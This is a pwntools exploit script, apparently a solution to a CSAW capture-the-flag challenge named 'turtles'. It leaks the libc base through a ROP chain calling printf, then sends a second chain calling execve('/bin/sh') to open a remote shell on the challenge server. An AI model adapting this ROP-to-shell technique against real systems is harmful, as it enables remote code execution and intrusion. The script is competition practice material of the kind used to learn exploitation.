from pwn import *
os.environ['LD_LIBRARY_PATH'] = '/home/kylebot/Desktop/Problems/CSAQ_18/turtles/libs'

#r = process(['./ld-linux-x86-64.so.2', './turtles'])
#r = process('./turtles')
r = remote('pwn.chal.csaw.io', 9003)
e = ELF('./turtles')
libc = ELF('libs/libc.so.6')
context.arch = 'amd64'

# config
main_ptr = e.search(p64(e.symbols['main'])).next()
popchain = 0x0000000000400d3b# : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
ret = 0x00000000004009a1# : ret
prdi = 0x0000000000400d43# : pop rdi ; ret
prsi_p = 0x0000000000400d41# : pop rsi ; pop r15 ; ret
prbp = 0x0000000000400ac0# : pop rbp ; ret

r.recvuntil('Here is a Turtle: ')
#gdb.attach(r, "b *0x7ffff73f3c89\nb *0x7ffff73f3c9e\nb *0x0000000000400d3b")

# leak libc
turtle = int(r.recvuntil('\n'), 16)
log.info('turtle: %#x' % turtle)
func = popchain
padding = p64(turtle)+p64(ret)*3+p64(popchain)+p64(turtle-0x64*8+0x30)+p64(turtle+0x38-0x15*8)+p64(func)+p64(turtle+0x28)+'B'*8
rop = []
rop += [prdi, e.got['printf']]
rop += [e.plt['printf']]
rop += [e.symbols['main']]
r.send(padding+flat(rop))
libc_base = u64(r.recv(6)+'\x00\x00') - libc.symbols['printf']
execve = libc.symbols['execve'] + libc_base
log.info('libc base: %#x' % libc_base)

# execve to lauch shell
r.recvuntil('Here is a Turtle: ')
turtle = int(r.recvuntil('\n'), 16)
padding = p64(turtle)+p64(ret)*3+p64(popchain)+p64(turtle-0x64*8+0x30)+p64(turtle+0x38-0x15*8)+p64(func)+p64(turtle+0x28)+'B'*8
rop = []
rop += [prdi, libc_base+libc.search('/bin/sh\x00').next()]
rop += [libc_base+147749, 0]
rop += [libc_base+7054, 0]
rop += [execve]
r.send(padding+flat(rop)+'C'*0x10)

r.interactive()
